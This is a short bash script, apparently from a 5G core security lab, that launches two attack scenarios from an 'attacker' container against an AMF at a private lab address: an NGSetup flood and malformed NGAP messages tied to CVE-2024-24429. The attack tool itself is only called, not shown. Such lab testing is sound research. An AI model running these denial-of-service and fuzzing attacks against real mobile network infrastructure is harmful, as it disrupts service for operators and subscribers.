#!/usr/bin/env bash
# Tier 3 — NAS/NGAP (N2) dari attacker ke AMF (SCTP). ISeCure 2025; CVE-2024-24429.
#   bash scenarios/tier3_nas_ngap/run_tier3.sh [all|T3-02|T3-03]
set -euo pipefail
cd "$(dirname "$0")/../.."
RS="scripts/run_scenario.sh"
AMF_N2="172.23.0.32"; SRC="172.23.0.50"; OK="--i-understand-lab-only"
T="docker exec attacker python3 /opt/attacker/tools/ngap_attack.py"
docker compose up -d attacker >/dev/null 2>&1 || docker start attacker >/dev/null 2>&1 || true
sleep 3
run_T3_02() { bash "$RS" 3 T3-02 ngap_ngsetup_flood "$SRC" "$AMF_N2" N2 20 $OK -- $T ngsetup_flood "$AMF_N2" 15 120; }
run_T3_03() { bash "$RS" 3 T3-03 ngap_malformed     "$SRC" "$AMF_N2" N2 20 $OK -- $T malformed     "$AMF_N2" 15 80; }
WHICH="${1:-all}"; sl() { echo; sleep 3; }
if [[ "$WHICH" == all ]]; then run_T3_02; sl; run_T3_03; else "run_${WHICH//-/_}"; fi
echo "== Tier 3 selesai =="
